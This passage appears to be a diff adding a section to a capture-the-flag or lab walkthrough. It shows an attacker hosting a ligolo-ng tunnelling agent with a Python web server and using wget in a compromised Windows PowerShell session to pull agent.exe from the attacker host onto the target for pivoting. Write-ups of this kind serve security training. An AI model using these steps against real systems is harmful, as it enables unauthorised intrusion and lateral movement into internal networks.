@@ -631,3 +631,31 @@ I could use a tool like ligolo-ng to access the internal service!
 
 First ill download the appropriate windows agent and also the linux proxy
 
+```python
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+Ill host the agent using a python web server!
+
+```python
+PS C:\Users\tstark\Documents> wget http://10.10.14.90:8000/agent.exe -o agent.exe
+wget http://10.10.14.90:8000/agent.exe -o agent.exe
+PS C:\Users\tstark\Documents> dir
+dir
+
+
+    Directory: C:\Users\tstark\Documents
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         5/12/2026   8:28 PM        7302656 agent.exe                                                            
+
+
+PS C:\Users\tstark\Documents> 
+```
+Now the agent is on the target!
+
+```python
+
+```
